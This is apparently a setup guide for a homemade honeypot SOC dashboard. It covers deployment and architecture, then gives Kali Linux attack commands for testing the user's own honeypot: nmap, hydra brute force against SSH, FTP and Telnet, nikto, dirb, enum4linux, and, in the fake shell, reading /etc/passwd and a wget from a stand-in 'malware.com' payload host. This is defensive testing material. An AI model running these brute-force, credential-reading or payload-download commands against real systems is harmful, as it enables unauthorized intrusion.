# AI/ML Honeypot SOC Dashboard - Ultimate Guide

This is your comprehensive manual for deploying the Honeypot SOC (Security Operations Center) Dashboard, understanding its architecture, and conducting live penetration testing using Kali Linux.

---

## 🚀 Part 1: Deployment & Setup

The project uses a **FastAPI** backend to run the honeypots and serve the API, and a **React** frontend for the SOC Dashboard.

### 1. Build the React Frontend
Whenever you make changes to the UI (React code), you must build it so the backend can serve it.
```powershell
cd t:\honey\frontend
npm install
npm run build
```
*This creates the optimized `build/` directory containing your HTML/CSS/JS.*

### 2. Start the Backend & Honeypots
You need two simultaneous processes running in your backend folder.
Open two PowerShell terminals in `t:\honey\backend`:

**Terminal 1 (Start the Honeypots):**
```powershell
# Activates the virtual environment and starts the honeypot listeners
.venv\Scripts\activate
python run.py
```

**Terminal 2 (Start the SOC Dashboard API):**
```powershell
# Activates the virtual environment and starts the dashboard server
.venv\Scripts\activate
python dashboard.py
```

Now open your browser to **http://localhost:8000** to view your live SOC war-room.

---

## 🏗️ Part 2: Project Architecture

```plaintext
honey/
├── frontend/                 # React UI Dashboard
│   ├── src/                  # React source code (Dashboard, Maps, Intelligence)
│   ├── build/                # Compiled static frontend served by FastAPI
│   └── package.json          # Node dependencies
│
└── backend/                  # Python/FastAPI Backend
    ├── dashboard.py          # Port 8000: Serves API endpoints and React UI
    ├── run.py               # Starts honeypots on ports 2121, 2222, 4450, etc.
    ├── config.py             # Defines all honeypot ports
    └── data_collection/      # SQLite Database (telemetry storage)
```

---

## ⚔️ Part 3: Kali Linux Penetration Testing Guide

To verify your SOC Dashboard is capturing threat telemetry accurately, you can simulate a cyber attack from a Kali Linux machine on the same network. 

> **Important**: Find your Windows machine's IP address by running `ipconfig` in PowerShell (e.g., `192.168.1.50`). Replace `YOUR_WINDOWS_IP` in the commands below with that address.

### Step 1: Network Reconnaissance (Nmap)
Real attackers always begin by scanning for open ports. Run this to trigger the map and "Layer Distribution" charts.
```bash
nmap -p 2121,2122,2222,2223,2323,4450,8081 -sV YOUR_WINDOWS_IP
```

### Step 2: SSH Brute Forcing & Interactive Shells (Ports 2222, 2223)
Generate critical threat alerts and populate your Credentials Table.
**Brute Force Attack (Hydra):**
```bash
hydra -l root -P /usr/share/wordlists/fasttrack.txt ssh://YOUR_WINDOWS_IP:2223 -t 4
```
**Interactive Shell (Triggering "Live Commands"):**
```bash
ssh root@YOUR_WINDOWS_IP -p 2223
# Once inside the fake shell, type:
cat /etc/passwd
wget http://malware.com/payload.sh
```

### Step 3: FTP Probing (Ports 2121, 2122)
Attackers look for misconfigured FTP servers. 
**Credential Spraying:**
```bash
hydra -l admin -P /usr/share/wordlists/fasttrack.txt ftp://YOUR_WINDOWS_IP:2122 -t 4
```

### Step 4: Web Server Attacks (Port 8081)
Test the HTTP honeypot using common web vulnerabilities scanners.
**Web Vulnerability Scan (Nikto):**
```bash
nikto -h http://YOUR_WINDOWS_IP:8081
```

**Directory Busting (Dirb):**
```bash
dirb http://YOUR_WINDOWS_IP:8081 /usr/share/dirb/wordlists/common.txt
```

### Step 5: SMB Enumeration (Port 4450)
Simulate ransomware or worm behavior (like WannaCry) looking for exposed file shares.
```bash
enum4linux -a YOUR_WINDOWS_IP -p 4450
```

### Step 6: Telnet IoT Botnet Simulation (Port 2323)
Simulate Mirai-style botnets brute-forcing IoT devices.
```bash
hydra -l admin -P /usr/share/wordlists/fasttrack.txt telnet://YOUR_WINDOWS_IP:2323 -t 4
```

### 📈 Step 7: Verify Dashboard Telemetry
After running these attacks:
1. **Threat Intelligence View**: Your Kali IP should be labeled a "Critical" threat with a 100% confidence score.
2. **Dashboard Pulse Banner**: Will report a massive spike in recent layer attacks.
3. **Credentials Table**: Will overflow with combinations of `root`, `admin`, and the passwords Hydra supplied.
4. **Active Sessions**: Will show exactly how long your SSH and Telnet connections remained open.
